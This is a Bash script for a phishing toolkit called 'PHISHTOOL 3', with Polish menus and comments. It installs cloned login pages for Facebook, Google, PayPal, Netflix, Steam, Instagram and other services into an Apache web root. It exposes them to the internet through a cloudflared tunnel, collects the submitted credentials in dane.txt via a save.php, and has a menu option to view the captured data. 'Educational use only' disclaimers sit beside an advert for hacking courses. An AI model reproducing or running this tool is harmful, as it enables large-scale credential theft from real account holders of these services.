#!/bin/bash
sudo service apache2 start



epicgames_login_page()
{
	echo "wybrales epicgames";
	sudo rm /var/www/html/index.html
	sudo cp epicgames/index.html /var/www/html/index.html
	sudo cloudflared tunnel --url http://localhost:80 
	sudo rm /var/www/html/index.html
}

facebook_login_page()
{
	echo "wybrales fb";
	sudo rm /var/www/html/index.html
	sudo cp facebook/index.html /var/www/html/index.html
	sudo cloudflared tunnel --url http://localhost:80 
	sudo rm /var/www/html/index.html
}

poczta_onetlogin_page()
{
	echo "wybrales poczta_onet";
	sudo rm /var/www/html/index.html
	sudo cp onet/index.html /var/www/html/index.html
	sudo cloudflared tunnel --url http://localhost:80 
	sudo rm /var/www/html/index.html
}




facebook_secure_login_page()
{
	echo "wybrales fb";
	sudo rm /var/www/html/index.html
	sudo cp fb_secure/index.html /var/www/html/index.html
    	sudo cloudflared tunnel --url http://localhost:80 
	sudo rm /var/www/html/index.html
}



netflix_login_page()
{
	echo "wybrales Netflixa";
	sudo rm /var/www/html/index.html
	sudo cp netflix/index.html /var/www/html/index.html
	sudo cloudflared tunnel --url http://localhost:80 
	sudo rm /var/www/html/index.html
}

linkedin_login_page()
{
	echo "wybrales Linkedin";
	sudo rm /var/www/html/index.html
	sudo cp linkedin/index.html /var/www/html/index.html
	sudo cloudflared tunnel --url http://localhost:80 
	sudo rm /var/www/html/index.html
}
instagram_login_page()
{
	echo "wybrales Instagram";
	sudo rm /var/www/html/index.html
	sudo cp instagram/index.html /var/www/html/index.html
	sudo cloudflared tunnel --url http://localhost:80 
	sudo rm /var/www/html/index.html
}
snapchat_login_page()
{
	echo "wybrales Snapchat";
	sudo rm /var/www/html/index.html
	sudo cp snapchat/index.html /var/www/html/index.html
	sudo cloudflared tunnel --url http://localhost:80 
	sudo rm /var/www/html/index.html
}

github_login_page()
{
	echo "wybrales Github";
	sudo rm /var/www/html/index.html
	sudo cp github/index.html /var/www/html/index.html
	sudo cloudflared tunnel --url http://localhost:80 
	sudo rm /var/www/html/index.html
}

google_login_page()
{
	echo "wybrales Google";
	sudo rm /var/www/html/index.html
	sudo cp google/index.html /var/www/html/index.html
	sudo cloudflared tunnel --url http://localhost:80 
	sudo rm /var/www/html/index.html

}

paypal_login_page()
{
	echo "wybrales Paypal";
	sudo rm /var/www/html/index.html
	sudo cp paypal/index.html /var/www/html/index.html
	sudo cloudflared tunnel --url http://localhost:80 
	sudo rm /var/www/html/index.html

}

messenger_login_page()
{
	echo "wybrales messenger";
	sudo rm /var/www/html/index.html
	sudo cp messenger/index.html /var/www/html/index.html
	sudo cloudflared tunnel --url http://localhost:80 
	sudo rm /var/www/html/index.html
}

steam_login_page()
{
	echo "wybrales steam'a";
	sudo rm /var/www/html/index.html
	sudo cp steam/index.html /var/www/html/index.html
	sudo cloudflared tunnel --url http://localhost:80 
	sudo rm /var/www/html/index.html
}



instal_env()
{
	sudo touch /var/www/html/dane.txt
	sudo chown www-data:www-data /var/ww/html/dane.txt
	sudo chmod 666 /var/www/html/dane.txt 
	# Pobierz najnowszy cloudflared (64-bit Linux)
	wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64

	# Nadaj uprawnienia do wykonania
	chmod +x cloudflared-linux-amd64

	# Przenieś plik do /usr/local/bin (żeby mieć dostęp w całym systemie)
	sudo mv cloudflared-linux-amd64 /usr/local/bin/cloudflared

	# Sprawdź czy działa
	cloudflared --version
	sudo apt install xdg-utils
	clear && echo " Uruchom narzedzie ponownie"

}


wyswietl_przechwycone_dane()
{
	echo " za chwile zobaczysz przechwycone dane, wyswietla sie na 10 sekund a pozniej znikna... plik z przechwyconymi danymi masz w /var/www/html/dane.txt"
	sleep 10
	cat /var/www/html/dane.txt
	sleep 10
	clear
	sudo bash run.sh
}


exit_work()
{
	exit
}

figlet PHISHTOOL 3
echo "Narzędzie powstało tylko do celów edukacyjnych! --> phishtool Version 3"
sudo cp save.php /var/www/html/save.php
echo " ------------------------------------------------------------------------------------------------------- "
echo "   Uzywaj tylko do celow naukowych i testowych."
echo "   Narzędzie służy wyłącznie do celów **edukacyjnych** i **etycznych**."
echo "   Nie należy go używać przeciwko osobom trzecim ani poza legalnie autoryzowanym środowiskiem testowym."
echo "   Jesli pojawia sie problemy z narzedziem - DAJ MI ZNAC - na www.skumajhacking.pl/kontakt"


echo "   Autor narzedzia nie ponosi odpowiedzialnosci za uzycie narzedzia w nieetycznym celu"
echo " ------------------------------------------------------------------------------------------------------- "
echo -e "\e[5m  KUP KURSY HACKINGU NA WWW.EHAKER.PL \e[0m"
echo "Wybierz opcje"
echo "================="
echo -e "\e[31m  [0] PRZYGOTUJ SRODOWISKO DO DZIALANIA"
echo -e "\e[31m  [1] Facebook\e[0m"
echo -e "\e[31m  [2] Netflix\e[0m"
echo -e "\e[31m  [3] Linkedin\e[0m"
echo -e "\e[31m  [4] Instagram\e[0m"
echo -e "\e[31m  [5] Snapchat\e[0m"
echo -e "\e[31m  [6] Github\e[0m"
echo -e "\e[31m  [7] Google\e[0m"
echo -e "\e[31m  [8] PayPal\e[0m"
echo -e "\e[31m  [9] Messenger\e[0m"
echo -e "\e[31m  [10] Steam\e[0m"
echo -e "\e[31m  [11] Facebook Secure Page\e[0m"
echo -e "\e[31m  [12] Poczta Onet\e[0m"
echo -e "\e[31m  [13] Epic Games\e[0m"
echo -e "\e[92m  [14] EXIT \e[0m"
echo -e "\e[92m  [15] Wyswietl przechwycone dane"
echo "================="




read opcja
 

case "$opcja" in

  "0") instal_env ;;
  "1") facebook_login_page ;;
  "2") netflix_login_page ;;
  "3") linkedin_login_page ;;
  "4") instagram_login_page ;;
  "5") snapchat_login_page ;;
  "6") github_login_page ;;
  "7") google_login_page ;;
  "8") paypal_login_page ;;
  "9") messenger_login_page ;;
  "10") steam_login_page ;;
  "11") facebook_secure_login_page ;;
  "12") poczta_onetlogin_page ;;
  "13") epicgames_login_page ;;
  "14") exit_work ;;
  "15") wyswietl_przechwycone_dane ;;
  *)  clear && ./run.sh
  
esac

echo " Narzędzie zakończyło pracę "
sudo service apache2 stop
sleep 2
exit

